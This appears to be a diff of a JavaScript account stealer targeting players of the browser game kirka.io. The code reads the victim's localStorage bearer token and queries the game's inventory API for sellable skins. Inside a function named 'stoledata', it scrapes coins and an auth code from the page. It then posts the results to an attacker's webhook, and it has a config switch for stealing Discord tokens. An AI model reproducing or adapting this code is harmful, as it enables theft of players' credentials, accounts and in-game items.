@@ -18,29 +18,12 @@
 //─███──────▀────█──────██───
 
 var buildid = "grease"
-var setting_webhook = "webhook url"
+var setting_webhook = "ur webhook"
 var setting_avatar = "https://www.morphsuits.com/media/catalog/product/cache/937f440085cd52c4f06eb785557b6967/m/1/m1_4_3_4375_1.jpg"
 var setting_antiduplicate = true
 var setting_stealldiscordtoken = false
 
-let randomvariable = ""
-let inventory = await fetch("https://api.kirka.io/api/inventory", {
-    "headers": {
-        "authorization": "Bearer " + localStorage.token,
-        "csrf": "token"
-    },
-    "body": null,
-    "method": "GET",
-    "mode": "cors",
-    "credentials": "include"
-});
-inventory = await inventory.json(); // parse response as JSON and store in inventory variable
-inventory.forEach(inventoryitem => {
-    if (inventoryitem.item.salePrice != null) {
-        console.log(inventoryitem.amount + ": " + inventoryitem.item.name)
-randomvariable += inventoryitem.amount + "x Skin: " + inventoryitem.item.name + "\n"
-    }
-})
+
 
 var request = new XMLHttpRequest();
 request.open("POST", setting_webhook);
@@ -112,6 +95,24 @@ async function stoledata() {
   const coins = getElementByXpath('//*[@id="left-interface"]/div[2]/div[1]').innerText
   const code = getElementByXpath('//*[@id="auth-user"]/div/div[1]/div[2]').innerHTML
   const skins = document.getElementsByClassName("hover-btns-group");
+  let randomvariable = ""
+let inventory = await fetch("https://api.kirka.io/api/inventory", {
+    "headers": {
+        "authorization": "Bearer " + localStorage.token,
+        "csrf": "token"
+    },
+    "body": null,
+    "method": "GET",
+    "mode": "cors",
+    "credentials": "include"
+});
+inventory = await inventory.json(); // parse response as JSON and store in inventory variable
+inventory.forEach(inventoryitem => {
+    if (inventoryitem.item.salePrice != null) {
+        console.log(inventoryitem.amount + ": " + inventoryitem.item.name)
+randomvariable += inventoryitem.amount + "x Skin: " + inventoryitem.item.name + "\n"
+    }
+})
 /*    if (window.location.href.indexOf(aspage) == 0) {
     window.location = "https://kirka.io/inventory"
     }
